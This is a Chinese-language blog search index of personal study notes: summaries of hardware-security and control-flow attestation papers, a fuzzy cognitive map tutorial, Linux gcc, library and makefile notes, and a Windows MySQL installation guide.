<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>A multi-flow information flow tracking approach for proving quantitative hardware security properties</title>
    <url>/2020/09/03/A-multi-flow-information-flow-tracking-approach/</url>
    <content><![CDATA[<h2 id="Key-words"><a href="#Key-words" class="headerlink" title="Key words"></a>Key words</h2><p>hardware security; Information Flow Tracking (IFT); multi-flow IFT; security property</p>
<h2 id="Structure"><a href="#Structure" class="headerlink" title="Structure"></a>Structure</h2><p><img src="/2020/09/03/A-multi-flow-information-flow-tracking-approach/image-20210524202126427.png" alt="image-20210524202126427"></p>
<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://ieeexplore.ieee.org/document/9121656">https://ieeexplore.ieee.org/document/9121656</a></p>
]]></content>
      <categories>
        <category>科研</category>
      </categories>
      <tags>
        <tag>文献</tag>
        <tag>信息流跟踪</tag>
        <tag>硬件安全</tag>
      </tags>
  </entry>
  <entry>
    <title>C-FLAT Control-Flow Attestation for Embedded Systems Software</title>
    <url>/2021/05/19/Control-Flow-Attestation-for-Embedded-Systems-Software/</url>
    <content><![CDATA[<h2 id="Keywords"><a href="#Keywords" class="headerlink" title="Keywords"></a>Keywords</h2><p>远程认证；控制流攻击；嵌入式系统安全</p>
<h2 id="Problem-Setting"><a href="#Problem-Setting" class="headerlink" title="Problem Setting"></a>Problem Setting</h2><p><img src="/2021/05/19/Control-Flow-Attestation-for-Embedded-Systems-Software/image-20210519153200738.png" alt="image-20210519153200738"></p>
<ul>
<li>如果通过认证，则进入授权路径；否则进入无授权路径<ul>
<li>授权路径：N1-N2-N5-N4</li>
<li>无授权路径：N1-N3-N6-N4</li>
</ul>
</li>
<li>有控制流漏洞的程序（比如可能存在栈溢出的情况），可能会通过修改某些函数变量的值，间接修改函数返回的地址，这样就会导致程序按非预期的（非授权的）路径运行</li>
</ul>
<h2 id="System-Model"><a href="#System-Model" class="headerlink" title="System Model"></a>System Model</h2><p><img src="/2021/05/19/Control-Flow-Attestation-for-Embedded-Systems-Software/image-20210519160106939.png" alt="image-20210519160106939"></p>
<p><strong>目标：</strong>Ver 希望确定远程嵌入式系统 Prv 的运行时控制流</p>
<ol>
<li>通过静态分析，生成控制流图</li>
<li>测量每个可能的控制流路径，并存到数据库</li>
<li>Ver 向 Prv 发起挑战，Prv 执行一个函数，然后计算被执行的 CFG（控制流图）。这样会生成一个经过认证的数字签名，并存至数据库。</li>
</ol>
<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>这篇论文的主要工作是提出一种认证，这种控制流认证会使系统的安全控制流程被写入数据库，这个数据库（我认为也可以是其他的一些数据结构）会在我们后续的研究中，比如安全状态观测和动态调整流程或许是有用的。</p>
<h2 id="Ref"><a href="#Ref" class="headerlink" title="Ref"></a>Ref</h2><p><a href="https://dl.acm.org/doi/10.1145/2976749.2978358">https://dl.acm.org/doi/10.1145/2976749.2978358</a></p>
]]></content>
      <categories>
        <category>科研</category>
      </categories>
      <tags>
        <tag>文献</tag>
        <tag>控制流</tag>
      </tags>
  </entry>
  <entry>
    <title>FCM</title>
    <url>/2020/07/30/FCM/</url>
    <content><![CDATA[<h2 id="模糊认知图（Fuzzy-Cognitive-Map，FCM）基本结构与原理"><a href="#模糊认知图（Fuzzy-Cognitive-Map，FCM）基本结构与原理" class="headerlink" title="模糊认知图（Fuzzy Cognitive Map，FCM）基本结构与原理"></a>模糊认知图（Fuzzy Cognitive Map，FCM）基本结构与原理</h2><h3 id="结构"><a href="#结构" class="headerlink" title="结构"></a>结构</h3><ol>
<li>基本的关系：</li>
</ol>
<p>　　模糊认知图(FCM) = 模糊逻辑(Fuzzy logic) + 神经网络(Neural Network)</p>
<ol>
<li>组成结构[1]</li>
</ol>
<p>　　模糊认知图是有向图，它由表示概念(concept)的节点和带有权值(weight)的弧线组成。模糊认知图中的所有值都是模糊值，比如可以取值：concept value ∈ [0,1]  weight value ∈ [-1,1]。一个concept可以影响其他的concept，同时，可以在构造模糊认知图的过程中不断增减互连关系或concept。一个具有n个概念节点的模糊认知图，可以用一个nxn阶矩阵W唯一确定。</p>
<p><img src="/2020/07/30/FCM/1931211-20200721105224495-580384554.png" alt="img"></p>
<h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>　　每个concept都代表着系统的一项特征，它们可能用于表征系统中事件、行为、目标等。每个concept的值用一个数字Ai表示，这个值由系统变量的真实值转换而成。</p>
<p>　　两个concept：Ci与Cj之间的关系分三种情况：</p>
<p>　　　　Wij &gt; 0 　Ci与Cj正相关</p>
<p>　　　　Wij &lt; 0 　Ci与Cj负相关</p>
<p>　　　　Wij = 0 　Ci与Cj无因果关系</p>
<p>　　影响当前concept值(Ai)的因素有：该concept前时刻的值Aiold + 所有与它相连的其它concept值乘以权值后的总和。</p>
<p><img src="/2020/07/30/FCM/1931211-20200721121621259-1344638528.png" alt="img"></p>
<p><img src="/2020/07/30/FCM/1931211-20200721132104153-1572744170.png" alt="img"></p>
<h3 id="基本的应用方法"><a href="#基本的应用方法" class="headerlink" title="基本的应用方法"></a>基本的应用方法</h3><ol>
<li><p>首先由<strong>若干</strong>专家确定最适合描述该系统的concept（可以是系统的特征、状态、变量、系统的输入或输出等），并给定一个<strong>模糊值</strong>（fuzzy value）来表征concept之间的互连关系（正/负相关）</p>
</li>
<li><p>以上提到的模糊值（权值）需要考虑：</p>
</li>
</ol>
<p>　　a. 权重的符号，Ci是否会影响Cj</p>
<p>　　b. Ci对Cj的影响程度</p>
<p> 反之亦然。</p>
<ol>
<li><p>然后整合这些专家的意见，此时需要给每位专家一个<strong>信誉值（credibility）</strong>，在整合前，给每位专家的FCM乘以他们对应的信誉值。</p>
</li>
<li><p>经过初始化后的FCM，其中的concept根据设定会相互影响，直到：</p>
</li>
</ol>
<p>　　a. 到达平衡 或</p>
<p>　　b. 到达限定周期 或</p>
<p>　　c. 出现混沌行为</p>
<p>以上的结果是：构造单个FCM</p>
<p>但有时，我们还需构造多个FCM去描述系统的不同模块，然后用类似的方法将它们集成到一个<strong>增强的FCM</strong>中。</p>
<p>tip: 当构造多个不同模块的FCM（如两层FCM）后，其中某个FCM中的部分concept可能会影响其他FCM的concept。</p>
<p><img src="/2020/07/30/FCM/1931211-20200721174650554-753912085.png" alt="img"></p>
<h3 id="训练方法"><a href="#训练方法" class="headerlink" title="训练方法"></a>训练方法</h3><p>目的：调整权值weight</p>
<p>可能的方法：</p>
<p>　　a. Differential Hebbian learning (DHL，微分Hebbian学习方法)是一种无监督的学习方法，未在实际系统中广泛运用[2]。</p>
<p>　　b. Nonlinear Hebbian learning (NHL，非线性Hebbian学习方法)[3]</p>
<p>　　　　非线性 Hebbian 算法是一种无监督权值学习方法，在系统权值学习具有广泛的应用。它利用权值关联的原因节点状态值与结果节点状态值的乘积对连接权值进行无向修正 , 没有其他约束条件来提高学习效率和模型准确度。</p>
<h4 id="四种非监督学习方法-4"><a href="#四种非监督学习方法-4" class="headerlink" title="四种非监督学习方法[4]"></a>四种非监督学习方法[4]</h4><h5 id="1-Signal-Hebbian"><a href="#1-Signal-Hebbian" class="headerlink" title="1. Signal Hebbian"></a>1. Signal Hebbian</h5><ul>
<li>关联局部神经元信号。</li>
<li>如果神经元i和神经元j同步激活，则突触能量增强或突触能量减弱。</li>
</ul>
<h5 id="2-Competitive"><a href="#2-Competitive" class="headerlink" title="2. Competitive"></a>2. Competitive</h5><ul>
<li>用0-1竞争信号（神经元j的信号）调制信号突触差异。</li>
<li>突触只在突触后神经元获胜时才学习。</li>
<li>突触后神经元编码突触前信号模式。</li>
</ul>
<h5 id="3-Differential-Hebbian"><a href="#3-Differential-Hebbian" class="headerlink" title="3. Differential Hebbian"></a>3. Differential Hebbian</h5><ul>
<li>关联信号速度和神经元信号。</li>
<li>通过神经元信号的微分获得信号速度。</li>
</ul>
<h5 id="4-Differential-Competitive"><a href="#4-Differential-Competitive" class="headerlink" title="4. Differential Competitive"></a>4. Differential Competitive</h5><ul>
<li>结合Competitive和Differential Hebbian</li>
<li>仅在有变化时学习</li>
</ul>
<hr>
<h2 id="神经网络的基本结构与原理"><a href="#神经网络的基本结构与原理" class="headerlink" title="神经网络的基本结构与原理"></a>神经网络的基本结构与原理</h2><h3 id="结构-1"><a href="#结构-1" class="headerlink" title="结构"></a>结构</h3><p><img src="/2020/07/30/FCM/1931211-20200721180819407-385103004.png" alt="img"></p>
<h3 id="原理-5"><a href="#原理-5" class="headerlink" title="原理[5]"></a>原理[5]</h3><ol>
<li><p>随机生成神经元间的权值</p>
</li>
<li><p>对输入层神经元的数据加权求和再用激励函数激活，得到隐藏层的值</p>
</li>
<li><p>用类似的方法加权求和并激活，得到输出层的值</p>
</li>
<li><p>计算以上得到的输出层的值，与训练集中数据相比的误差大小（误差趋近于0收敛）</p>
</li>
<li><p>根据误差大小，计算残差</p>
</li>
<li><p>输出层残差值加权求和，得到隐藏层的残差</p>
</li>
<li><p>隐藏层残差加权求和。。。</p>
</li>
<li><p>根据残差值调整权值</p>
</li>
</ol>
<h3 id="如何进行训练"><a href="#如何进行训练" class="headerlink" title="如何进行训练"></a>如何进行训练</h3><p>如以上，梯度下降法</p>
<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p>[1] Stylios C , Georgopoulos V C , Groumpos P P . The Use of Fuzzy Cognitive Maps in Modeling Systems[C]// 5th IEEE Mediterranean Conference on Control and Systems. IEEE, 1997.</p>
<p>[2] 陈宁, 彭俊洁, 王磊,等. 模糊灰色认知网络的建模方法及应用[J]. 自动化学报, 2018, v.44(07):77-86.</p>
<p>[3] Elpiniki Papageorgiou, Chrysostomos Stylios, Peter Groumpos. Fuzzy Cognitive Map Learning Based on Nonlinear Hebbian Rule[M]// AI 2003: Advances in Artificial Intelligence. Springer Berlin Heidelberg, 2003.</p>
<p>[4] Neural Networks and Fuzzy Systems课程ppt</p>
<p>[5] <a href="https://www.cnblogs.com/cxhzy/p/10891137.html">https://www.cnblogs.com/cxhzy/p/10891137.html</a></p>
]]></content>
      <categories>
        <category>科研</category>
      </categories>
      <tags>
        <tag>FCM</tag>
        <tag>科研</tag>
      </tags>
  </entry>
  <entry>
    <title>A Practical Approach to Constructing a Knowledge Graph for Cybersecurity</title>
    <url>/2020/09/07/Knowledge-Graph-for-Cybersecurity/</url>
    <content><![CDATA[<h2 id="Key-words"><a href="#Key-words" class="headerlink" title="Key words"></a>Key words</h2><p>Cybersecurity; Knowledge graph; Knowledge deduction</p>
<h2 id="Structure"><a href="#Structure" class="headerlink" title="Structure"></a>Structure</h2><p><img src="/2020/09/07/Knowledge-Graph-for-Cybersecurity/image-20210524202713003.png" alt="image-20210524202713003"></p>
<h2 id="Ref"><a href="#Ref" class="headerlink" title="Ref"></a>Ref</h2><p><a href="https://www.sciencedirect.com/science/article/pii/S2095809918301097">https://www.sciencedirect.com/science/article/pii/S2095809918301097</a></p>
]]></content>
      <categories>
        <category>科研</category>
      </categories>
      <tags>
        <tag>文献</tag>
        <tag>知识图谱</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux程序设计</title>
    <url>/2021/06/22/Linux%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1/</url>
    <content><![CDATA[<h2 id="第一章-基础知识"><a href="#第一章-基础知识" class="headerlink" title="第一章 基础知识"></a>第一章 基础知识</h2><h3 id="1-1-Linux-程序设计常识"><a href="#1-1-Linux-程序设计常识" class="headerlink" title="1.1 Linux 程序设计常识"></a>1.1 Linux 程序设计常识</h3><ul>
<li>GCC：GNU 编译器集，它包括 GNU C 编译器</li>
<li>G++：C++ 编译器，是 GCC 的一部分</li>
<li>C 语言编译器被简称为 cc</li>
</ul>
<h3 id="1-2-一些标准路径"><a href="#1-2-一些标准路径" class="headerlink" title="1.2 一些标准路径"></a>1.2 一些标准路径</h3><ul>
<li><code>/bin</code>：二进制文件目录，用于存放启动系统时用到的程序</li>
<li><code>/usr/bin</code>：用户二进制文件目录，用于存放用户使用的标准程序</li>
<li><code>/usr/local/bin</code>：本地二进制文件目录，用于存放软件安装的程序</li>
<li><code>/usr/sbin</code> 和 <code>/sbin</code>：系统管理员登陆后使用 PATH 变量可能还包含，系统管理程序的目录</li>
<li><code>/opt</code>：可选的操作系统组件和第三方应用程序可能被安装在此</li>
<li><code>lib</code> 和 <code>/usr/lib</code>：标准系统库文件</li>
</ul>
<p>关键位置：</p>
<ul>
<li>系统管理员一般喜欢使用 <code>/opt</code> 和 <code>/usr/local</code> 因为升级操作系统时只有这两个目录需要保留</li>
<li>gcc 一般位于 <code>/usr/bin</code> 或 <code>/usr/local/bin</code> 或 <code>/usr/lib/gcc</code> 中</li>
<li>C 语言头文件位于 <code>/usr/include</code> 及其子目录。哪些依赖 Linux 版本的头文件通常在 <code>/usr/include/sys</code> 和 <code>/usr/include/linux</code> 中</li>
</ul>
<h3 id="1-3-头文件与库文件之-gcc-使用"><a href="#1-3-头文件与库文件之-gcc-使用" class="headerlink" title="1.3 头文件与库文件之 gcc 使用"></a>1.3 头文件与库文件之 gcc 使用</h3><ul>
<li><p><code>-I/目录</code>：包含非标准位置的头文件</p>
</li>
<li><p><code>-L/目录</code>： 添加非标准位置的库</p>
</li>
</ul>
<hr>
<p><strong>库文件名</strong>：libc 指 C语言库，libm 指数学库；后缀 <code>.a</code> 代表传统静态函数库，<code>.so</code> 代表共享函数库</p>
<ul>
<li>拓展<ul>
<li><strong>静态库的缺点</strong>：如果同时运行很多程序都使用来自同意函数库的函数，内存中就会有同一函数的多份副本，造成资源浪费。</li>
</ul>
</li>
</ul>
<hr>
<h3 id="1-4-静态库实验"><a href="#1-4-静态库实验" class="headerlink" title="1.4 静态库实验"></a>1.4 静态库实验</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// fred.c</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">fred</span><span class="params">(<span class="keyword">int</span> arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;fred: we passed %d\n&quot;</span>, arg);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// bill.c</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">bill</span><span class="params">(<span class="keyword">char</span> *arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;bill: we passed %s\n&quot;</span>, arg);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li><code>gcc -c bill.c fred.c</code> 只编译不链接，生成两个对应的 <code>.o</code> 文件</li>
<li>为库文件创建一个头文件 lib.h</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// lib.h</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">bill</span><span class="params">(<span class="keyword">char</span> *)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">fred</span><span class="params">(<span class="keyword">int</span>)</span></span>;</span><br></pre></td></tr></table></figure>
<ul>
<li>编写调用程序 program.c</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;lib.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    bill(<span class="string">&quot;Hello World&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>编译调用程序并为编译器显示指定目标文件，并与编译好的 bill.o 链接</li>
</ul>
<figure class="highlight makefile"><table><tr><td class="code"><pre><span class="line">gcc -c program.c</span><br><span class="line">gcc -o program program.o bill.o</span><br><span class="line">./program </span><br></pre></td></tr></table></figure>
<p><img src="/2021/06/22/Linux%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1/image-20210622115212840.png" alt="image-20210622115212840"></p>
<hr>
<h4 id="1-4-1-将目标文件添加到归档文件（创建并使用一个库文件）"><a href="#1-4-1-将目标文件添加到归档文件（创建并使用一个库文件）" class="headerlink" title="1.4.1 将目标文件添加到归档文件（创建并使用一个库文件）"></a>1.4.1 将目标文件添加到归档文件（创建并使用一个库文件）</h4><ul>
<li><p><code>ar crv libfoo.a bill.o fred.o</code></p>
</li>
<li><p>使用库文件</p>
<ul>
<li>方法一：在当前文件列表直接使用：<code>gcc -o program program.o libfoo.a</code></li>
<li>方法二：使用 <code>-L</code> 访问函数库：<code>gcc -o program program.o -L. -lfoo</code><ul>
<li><code>-L.</code> 表示在当前目录查找库函数；<code>-lfoo</code> 表示使用 libfoo.a 的函数库（或者 libfoo.so 如果存在的话）</li>
</ul>
</li>
</ul>
</li>
</ul>
<hr>
<h3 id="1-5-共享库"><a href="#1-5-共享库" class="headerlink" title="1.5 共享库"></a>1.5 共享库</h3><ul>
<li><strong>与静态库的区别</strong>：程序本身不在包含库文件的代码，而是引用运行时可访问的共享代码。当编译好的程序被装载到内存中执行时，函数引用被解析成对共享库的调用。</li>
<li><strong>共享库的优点</strong>：<ul>
<li>系统只需要保留一个共享库副本</li>
<li>共享库的更新可以独立于依赖它的程序</li>
</ul>
</li>
</ul>
<h4 id="1-5-1-如何配置使系统搜索额外的共享库位置"><a href="#1-5-1-如何配置使系统搜索额外的共享库位置" class="headerlink" title="1.5.1 如何配置使系统搜索额外的共享库位置"></a>1.5.1 如何配置使系统搜索额外的共享库位置</h4><ul>
<li>修改 <code>/etc/ld.so.conf</code> 文件</li>
<li>执行 <code>ldconfig</code> 生效</li>
</ul>
<h4 id="1-5-2-如何查看一个程序需要的共享库"><a href="#1-5-2-如何查看一个程序需要的共享库" class="headerlink" title="1.5.2 如何查看一个程序需要的共享库"></a>1.5.2 如何查看一个程序需要的共享库</h4><ul>
<li><code>ldd 程序名</code>，比如</li>
</ul>
<p><img src="/2021/06/22/Linux%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1/image-20210622164051603.png" alt="image-20210622164051603"></p>
<h2 id="第九章-开发工具"><a href="#第九章-开发工具" class="headerlink" title="第九章 开发工具"></a>第九章 开发工具</h2><h3 id="9-1-make-与-makefile"><a href="#9-1-make-与-makefile" class="headerlink" title="9.1 make 与 makefile"></a>9.1 make 与 makefile</h3><ul>
<li>作用：控制源代码的编译（make 命令会根据 makefile 文件确定目标文件的创建顺序以及正确的规则调用顺序）</li>
</ul>
<h4 id="9-1-1-make-命令的选项"><a href="#9-1-1-make-命令的选项" class="headerlink" title="9.1.1 make 命令的选项"></a>9.1.1 make 命令的选项</h4><ul>
<li><code>-k</code>：遇到错误也继续执行</li>
<li><code>-n</code>：输出将要执行的下一步操作</li>
<li><code>-f &lt;filename&gt;</code>：告诉 make 将哪个文件作为 makefile<ul>
<li>如果不存在这个选项，make 会先找名为 makefile 的文件，不存在就再找 Makefile</li>
</ul>
</li>
</ul>
<h4 id="9-1-2-依赖关系的写法"><a href="#9-1-2-依赖关系的写法" class="headerlink" title="9.1.2 依赖关系的写法"></a>9.1.2 依赖关系的写法</h4><p><code>目标名称: 依赖的文件列表</code></p>
<ul>
<li><p>举例：</p>
<p>最终的程序 myapp 依赖 main.o 2.o 3.o；main.o 依赖 main.c a.h；2.o 依赖 2.c a.h b.h，3.o 依赖 3.c b.h c.h。</p>
<p>所以 main.o 受 main.c 和 a.h 影响，这两个文件修改了都要重新编译 main.c 以重建 main.o</p>
</li>
</ul>
<figure class="highlight makefile"><table><tr><td class="code"><pre><span class="line"><span class="section">myapp: main.o 2.o 3.o</span></span><br><span class="line"><span class="section">main.o: main.c a.h</span></span><br><span class="line"><span class="section">2.o: 2.c a.h b.h</span></span><br><span class="line"><span class="section">3.o: 3.c b.h c.h</span></span><br></pre></td></tr></table></figure>
<h4 id="9-1-3-编写规则"><a href="#9-1-3-编写规则" class="headerlink" title="9.1.3 编写规则"></a>9.1.3 编写规则</h4><font face="楷体" color="red">注意：makefile 中空格和制表符是有区别的</font>

<ul>
<li>规则所在行必须以<strong>制表符</strong>开头</li>
<li>makefile 中的行不能以空格结尾</li>
</ul>
<figure class="highlight makefile"><table><tr><td class="code"><pre><span class="line"><span class="section">myapp: main.o 2.o 3.o</span></span><br><span class="line">	gcc -o myapp main.o 2.o 3.o</span><br><span class="line"><span class="section">main.o: main.c a.h</span></span><br><span class="line">	gcc -c main.c</span><br><span class="line"><span class="section">2.o: 2.c a.h b.h</span></span><br><span class="line">	gcc -c 2.c</span><br><span class="line"><span class="section">3.o: 3.c b.h c.h</span></span><br><span class="line">	gcc -c 3.c</span><br></pre></td></tr></table></figure>
<h4 id="9-1-4-makefile-中的宏"><a href="#9-1-4-makefile-中的宏" class="headerlink" title="9.1.4 makefile 中的宏"></a>9.1.4 makefile 中的宏</h4><p>makefile 文件中的宏通常被用于设置编译器的选项、头文件目录等</p>
<figure class="highlight makefile"><table><tr><td class="code"><pre><span class="line"><span class="section">all: myapp</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Which compiler</span></span><br><span class="line">CC = gcc</span><br><span class="line"></span><br><span class="line"><span class="comment"># Where are include files kept</span></span><br><span class="line">INCLUDE = .</span><br><span class="line"></span><br><span class="line"><span class="section">myapp: main.o 2.o 3.o</span></span><br><span class="line">	<span class="variable">$(CC)</span> -o myapp main.o 2.o 3.o</span><br><span class="line">	</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<h4 id="9-1-5-makefile-中的特殊字符"><a href="#9-1-5-makefile-中的特殊字符" class="headerlink" title="9.1.5 makefile 中的特殊字符"></a>9.1.5 makefile 中的特殊字符</h4><ul>
<li><code>-</code>：告诉 make 命令忽略所有错误</li>
<li><code>@</code>：告诉 make 在执行某条命令之前不要将该命令显示在标准输出上</li>
</ul>
<h2 id="第十一章-进程和信号"><a href="#第十一章-进程和信号" class="headerlink" title="第十一章 进程和信号"></a>第十一章 进程和信号</h2>]]></content>
      <categories>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>读书笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>MySQL的安装与重新安装</title>
    <url>/2021/05/27/MySQL%E7%9A%84%E5%AE%89%E8%A3%85%E4%B8%8E%E9%87%8D%E6%96%B0%E5%AE%89%E8%A3%85/</url>
    <content><![CDATA[<h2 id="1-下载安装-MySQL-1"><a href="#1-下载安装-MySQL-1" class="headerlink" title="1 下载安装 MySQL[1]"></a>1 下载安装 MySQL[1]</h2><ul>
<li><a href="https://dev.mysql.com/downloads/mysql/">下载地址</a> </li>
<li>解压缩，并进入目录，新建 my.ini 配置文件，内容如下</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[client]</span><br><span class="line"># 设置mysql客户端默认字符集</span><br><span class="line">default-character-set=utf8</span><br><span class="line"> </span><br><span class="line">[mysqld]</span><br><span class="line"># 设置3306端口</span><br><span class="line">port = 3306</span><br><span class="line"># 设置mysql的安装目录</span><br><span class="line">basedir=D:\mysql-8.0.24-winx64</span><br><span class="line"># 允许最大连接数</span><br><span class="line">max_connections=20</span><br><span class="line"># 服务端使用的字符集默认为8比特编码的latin1字符集</span><br><span class="line">character-set-server=utf8</span><br><span class="line"># 创建新表时将使用的默认存储引擎</span><br><span class="line">default-storage-engine=INNODB</span><br></pre></td></tr></table></figure>
<ul>
<li>进入 bin 目录，初始化数据库 <code>mysqld --initialize --console</code> ，完成后得到初始密码 <code>Jm&gt;)=CuKn2ss</code> </li>
</ul>
<p><img src="/2021/05/27/MySQL%E7%9A%84%E5%AE%89%E8%A3%85%E4%B8%8E%E9%87%8D%E6%96%B0%E5%AE%89%E8%A3%85/1618907983989-09269ece-956b-4449-96df-9dc4ffc0eeba.png" alt="img"></p>
<ul>
<li><strong>安装：</strong> <code>mysqld install</code>（ 注意需要以管理员身份打开 cmd，否则执行该命令时会报 <code>Install/Remove of the Service Denied!</code> ）</li>
</ul>
<p><img src="/2021/05/27/MySQL%E7%9A%84%E5%AE%89%E8%A3%85%E4%B8%8E%E9%87%8D%E6%96%B0%E5%AE%89%E8%A3%85/1618908295769-1dc4acc4-da15-4405-85e5-cb105662c403.png" alt="img"></p>
<h2 id="2-启动与登录"><a href="#2-启动与登录" class="headerlink" title="2 启动与登录"></a>2 启动与登录</h2><ul>
<li><strong>启动：</strong><code>net start mysql</code> （同理 <code>net stop mysql</code> 可停止服务）（管理员身份）</li>
</ul>
<p><img src="/2021/05/27/MySQL%E7%9A%84%E5%AE%89%E8%A3%85%E4%B8%8E%E9%87%8D%E6%96%B0%E5%AE%89%E8%A3%85/1618908335828-17e2ab74-3c3f-4e23-be53-b53b206daf38.png" alt="img"></p>
<ul>
<li><p><strong>登录</strong></p>
<ul>
<li>登录本地：<code>mysql -u root -p</code> 然后输入上文得到的初始密码即可</li>
</ul>
</li>
<li><p><strong>注意：</strong>个人经验，最好在服务中将 MySQL 设置为手动（先命令行 net stop mysql 再将服务调整为手动）</p>
</li>
</ul>
<p><img src="/2021/05/27/MySQL%E7%9A%84%E5%AE%89%E8%A3%85%E4%B8%8E%E9%87%8D%E6%96%B0%E5%AE%89%E8%A3%85/1621566205760-ead873af-6ad2-4029-b595-34f75f0a1c7b.png" alt="img"></p>
<h2 id="3-修改登录密码-2"><a href="#3-修改登录密码-2" class="headerlink" title="3 修改登录密码[2]"></a>3 修改登录密码[2]</h2><ul>
<li><strong>注意：这里在配置文件中添加的参数可能会导致关闭服务后就无法再启动服务了。所以不要按以下步骤修改密码</strong><ul>
<li><strong>启动服务 net start mysql (不能先停止服务再修改 ini 配置，否则会无法启动)</strong></li>
<li><strong>修改 ini</strong></li>
<li><strong>登录本地 MySQL</strong></li>
<li><strong>修改密码，退出登录</strong></li>
<li><strong>关闭服务 net stop mysql</strong></li>
<li><strong>删除此前添加的有关密码</strong></li>
</ul>
</li>
</ul>
<p>以上步骤完成后，启动服务发现修改后的密码可以使用了。更具体的部分细节如下</p>
<ul>
<li>修改配置文件 my.ini：在文件末尾追加两行参数</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 添加密码验证插件</span><br><span class="line">plugin-load-add=validate_password.so</span><br><span class="line">#服务器在启动时加载插件，并防止在服务器运行时删除插件</span><br><span class="line">validate-password=FORCE_PLUS_PERMANENT</span><br></pre></td></tr></table></figure>
<ul>
<li>root 登录本地 MySQL <code>mysql -u root -p</code> </li>
<li>将密码修改为 0000 </li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">alter user &#x27;root&#x27;@&#x27;localhost&#x27; identified by &#x27;0000&#x27;;</span><br></pre></td></tr></table></figure>
<p><img src="/2021/05/27/MySQL%E7%9A%84%E5%AE%89%E8%A3%85%E4%B8%8E%E9%87%8D%E6%96%B0%E5%AE%89%E8%A3%85/1618910278709-526302e4-0e37-452c-a7ce-7c55df2a3c7e.png" alt="img"></p>
<ul>
<li>修改成功</li>
</ul>
<h2 id="4-关于重新安装"><a href="#4-关于重新安装" class="headerlink" title="4  关于重新安装"></a>4  关于重新安装</h2><ul>
<li>删除 MySQL 服务 <code>sc delete mysql</code></li>
<li>删除原先的 MySQL 目录，解压缩 zip 文件重新安装（上文步骤）</li>
</ul>
<p>如果还不能正常安装，参考下文方法</p>
<ul>
<li>某日发现不能正常启动 MySQL 服务，遂前往服务查看，当手动启动 MySQL 服务时会报错。故只得将<a href="https://blog.csdn.net/weixin_45450428/article/details/104643956?utm_medium=distribute.pc_relevant.none-task-blog-baidujs_baidulandingword-0&amp;spm=1001.2101.3001.4242">原有 MySQL 文件和注册表中信息删除</a></li>
<li>但重新解压安装包，进行初始化时，会报错。解决方案也在其中，遂将 ini 文件中相关信息进行修改</li>
</ul>
<p><img src="/2021/05/27/MySQL%E7%9A%84%E5%AE%89%E8%A3%85%E4%B8%8E%E9%87%8D%E6%96%B0%E5%AE%89%E8%A3%85/1619596939296-f8a921ef-80f3-4095-9d81-bda8ca98900b.png" alt="img"></p>
<p><img src="/2021/05/27/MySQL%E7%9A%84%E5%AE%89%E8%A3%85%E4%B8%8E%E9%87%8D%E6%96%B0%E5%AE%89%E8%A3%85/1619597004542-fd7661f2-7bf7-4b59-89a0-d53475b7e85b.png" alt="img"></p>
<ul>
<li>然后<strong>将 data 目录删除</strong>，即可正常初始化</li>
</ul>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ol>
<li><a href="https://www.runoob.com/mysql/mysql-install.html">https://www.runoob.com/mysql/mysql-install.html</a></li>
<li><a href="https://blog.csdn.net/qq_44792624/article/details/107426590">https://blog.csdn.net/qq_44792624/article/details/107426590</a></li>
</ol>
]]></content>
      <categories>
        <category>解决方案</category>
      </categories>
      <tags>
        <tag>MySQL</tag>
      </tags>
  </entry>
  <entry>
    <title>N1BOOK</title>
    <url>/2020/11/11/N1BOOK/</url>
    <content><![CDATA[<font face="楷体" size="4">参考《从0到1 CTFer成长之路》</font>  

